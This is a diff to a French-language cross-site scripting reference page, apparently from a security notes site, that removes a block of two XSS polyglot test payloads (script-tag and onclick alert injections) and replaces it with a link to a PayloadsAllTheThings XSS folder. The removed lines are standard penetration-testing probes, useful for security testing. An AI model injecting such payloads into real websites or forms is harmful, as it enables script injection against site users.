@@ -7,12 +7,7 @@ permalink: /XSS/
 
 ## Payloads
 
-Les payloads suivants peuvent être utiles:
-
-```text
-';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-" onclick=alert(1)//<button ' onclick=alert(1)//>*/alert(1)//
-```
+Voir [PayloadAllTheThings](https://github.com/ruuand/PayloadsAllTheThings/tree/master/XSS%20injection)
 
 ## ASP.Net
 
